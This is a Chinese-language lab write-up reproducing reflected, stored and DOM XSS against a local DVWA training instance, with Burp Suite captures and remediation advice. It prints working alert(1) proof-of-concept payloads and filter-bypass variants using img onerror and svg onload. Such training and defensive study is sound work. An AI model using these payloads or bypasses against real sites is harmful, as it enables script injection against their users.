# XSS 漏洞复现报告

# 1. 实验简介

本实验基于 DVWA（Damn Vulnerable Web Application）搭建 Web 安全测试环境，针对 XSS（Cross Site Scripting，跨站脚本攻击）漏洞进行手工测试与漏洞复现。

本实验主要包括：

- Reflected XSS 反射型 XSS
- Stored XSS 存储型 XSS
- XSS Filter Bypass 过滤绕过
- DOM XSS 前端 DOM 型 XSS
- Burp Suite 抓包分析
- Repeater 手工修改 Payload

---

# 2. 实验环境

| 组件 | 说明 |
|---|---|
| 操作系统 | Windows 10 |
| 容器环境 | Docker Desktop |
| 漏洞靶场 | DVWA |
| 抓包工具 | Burp Suite Community Edition |
| 浏览器 | Google Chrome |

---

# 3. XSS 漏洞原理

XSS 全称为 Cross Site Scripting，中文为跨站脚本攻击。

XSS 的核心是：

攻击者将恶意 JavaScript 代码注入到网页中，当用户访问该网页时，浏览器会执行这些脚本。

XSS 主要攻击目标是：

- 浏览器
- 用户 Cookie
- 用户会话
- 页面 DOM
- 前端 JavaScript 执行环境

SQL 注入主要攻击数据库，而 XSS 主要攻击用户浏览器。

---

# 4. Reflected XSS 反射型 XSS

## 4.1 实验步骤

进入 DVWA：

```text
XSS (Reflected)
```

将安全等级设置为：

```text
Low
```

先输入普通文本：

```text
test
```

页面返回：

```text
Hello test
```

说明用户输入会被页面返回显示。

---

## 4.2 输入 XSS Payload

输入：

```html
<script>alert(1)</script>
```

页面弹出：

```text
1
```

说明 Payload 被浏览器执行。

---

## 4.3 漏洞原理

后端将用户输入直接拼接进 HTML 页面中：

```html
Hello <script>alert(1)</script>
```

浏览器解析页面时，识别到 script 标签并执行 JavaScript 代码。

这就是反射型 XSS。

反射型 XSS 的特点是：

- Payload 不会存入数据库
- 只在当前请求中生效
- 通常通过 URL 参数触发

---

# 5. Burp Suite 抓包分析

开启 Burp Suite：

```text
Proxy -> Intercept
```

提交 Payload 后，Burp 抓到请求：

```http
GET /vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: localhost:4280
Cookie: PHPSESSID=xxxx; security=low
```

其中：

```text
name=
```

是存在漏洞的参数。

Payload：

```html
<script>alert(1)</script>
```

经过 URL 编码后变为：

```text
%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

---

# 6. Repeater 手工测试

将请求发送到：

```text
Repeater
```

在 Repeater 中修改参数值后点击：

```text
Send
```

观察 Response，发现 Payload 被服务器返回到 HTML 页面中。

说明用户输入没有被正确转义，导致浏览器执行了 JavaScript。

---

# 7. Stored XSS 存储型 XSS

## 7.1 实验步骤

进入 DVWA：

```text
XSS (Stored)
```

页面中存在留言板输入框，包括：

```text
Name
Message
```

先输入普通内容：

```text
Name: test
Message: hello
```

提交后页面会显示留言。

---

## 7.2 输入 Stored XSS Payload

输入：

```text
Name: test
Message: <script>alert(1)</script>
```

点击提交后，浏览器弹出：

```text
1
```

刷新页面后仍然弹窗，说明 Payload 已经被保存到数据库中。

---

## 7.3 Stored XSS 原理

Stored XSS 的特点是：

- Payload 被保存到数据库
- 其他用户访问页面时也会执行
- 危害比 Reflected XSS 更大

攻击流程：

```text
攻击者提交恶意脚本
        ↓
服务端保存到数据库
        ↓
用户访问页面
        ↓
浏览器执行恶意 JavaScript
```

---

# 8. Stored XSS 抓包分析

Burp 抓到的请求通常为：

```http
POST /vulnerabilities/xss_s/ HTTP/1.1
Host: localhost:4280
Cookie: PHPSESSID=xxxx; security=low
```

请求体中可以看到：

```text
txtName=test&mtxMessage=<script>alert(1)</script>&btnSign=Sign+Guestbook
```

重点参数是：

```text
mtxMessage=
```

该参数保存了恶意 Payload。

---

# 9. XSS Filter Bypass 过滤绕过

## 9.1 修改安全等级

将 DVWA Security 设置为：

```text
Medium
```

再次测试：

```html
<script>alert(1)</script>
```

如果不再弹窗，说明 `<script>` 标签被过滤。

---

## 9.2 绕过 Payload

测试：

```html
<img src=1 onerror=alert(1)>
```

该 Payload 利用图片加载失败时触发 onerror 事件。

继续测试：

```html
<svg onload=alert(1)>
```

该 Payload 利用 SVG 标签加载时触发 onload 事件。

---

## 9.3 绕过原理

很多简单过滤规则只过滤：

```html
<script>
```

但浏览器可以通过多种 HTML 事件执行 JavaScript，例如：

| 事件 | 含义 |
|---|---|
| onerror | 加载失败时触发 |
| onload | 加载完成时触发 |
| onclick | 点击时触发 |
| onmouseover | 鼠标悬停时触发 |
| onfocus | 聚焦时触发 |

因此，单纯过滤 `<script>` 并不能完全防御 XSS。

---

# 10. DOM XSS

## 10.1 DOM XSS 简介

DOM XSS 主要发生在浏览器前端 JavaScript 中。

它的特点是：

- 不一定经过后端
- 不一定存入数据库
- 由前端 JavaScript 读取不可信输入并写入页面
- 更接近现代前端网站的安全问题

常见危险 API 包括：

```javascript
location.href
document.URL
innerHTML
eval
document.write
```

---

## 10.2 实验步骤

进入 DVWA：

```text
XSS (DOM)
```

观察 URL 参数，例如：

```text
default=English
```

将其修改为：

```text
default=<script>alert(1)</script>
```

或者使用 URL 编码：

```text
default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

如果浏览器弹出：

```text
1
```

说明 DOM XSS 成功。

---

## 10.3 DOM XSS 原理

DOM XSS 的核心在于：

前端 JavaScript 从 URL 中读取参数，并将其写入页面 DOM 中。

如果使用了危险写法：

```javascript
element.innerHTML = userInput;
```

当 userInput 为：

```html
<script>alert(1)</script>
```

浏览器就可能执行恶意脚本。

---

# 11. URL 编码分析

XSS Payload 在 HTTP 请求中经常会被 URL 编码。

例如：

```html
<script>alert(1)</script>
```

编码后：

```text
%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

常见编码：

| 字符 | 编码 |
|---|---|
| < | %3C |
| > | %3E |
| / | %2F |
| ( | %28 |
| ) | %29 |
| 空格 | + 或 %20 |

理解 URL 编码有助于分析 Burp 中的 HTTP 请求。

---

# 12. 漏洞危害

XSS 漏洞可能导致：

- Cookie 泄露
- 会话劫持
- 页面篡改
- 钓鱼攻击
- 用户身份冒用
- 恶意脚本长期传播

其中 Stored XSS 危害更大，因为 Payload 会被保存到数据库中，影响所有访问该页面的用户。

---

# 13. 修复建议

## 13.1 输出编码

对用户输入进行 HTML 实体编码：

```text
<  转义为  &lt;
>  转义为  &gt;
"  转义为  &quot;
'  转义为  &#x27;
```

---

## 13.2 输入校验

限制用户输入内容，只允许合法字符。

---

## 13.3 避免使用 innerHTML

前端应尽量避免：

```javascript
innerHTML
```

优先使用：

```javascript
textContent
```

---

## 13.4 设置 HttpOnly Cookie

为 Cookie 设置：

```text
HttpOnly
```

可以降低 Cookie 被 JavaScript 读取的风险。

---

## 13.5 配置 CSP

使用 Content Security Policy 限制脚本来源。

---

# 14. 实验总结

本实验完成了 DVWA 中 XSS 漏洞的完整基础复现，包括：

- Reflected XSS
- Stored XSS
- XSS Filter Bypass
- DOM XSS
- Burp 抓包
- Repeater 手工测试
- URL 编码分析

通过本实验，理解了 XSS 漏洞的核心原理：

用户输入未被正确过滤或转义，最终进入 HTML/JavaScript 执行环境，导致浏览器执行攻击者构造的脚本代码。

本实验为后续学习 CSRF、文件上传漏洞、前端安全和 Web 渗透测试打下了基础。
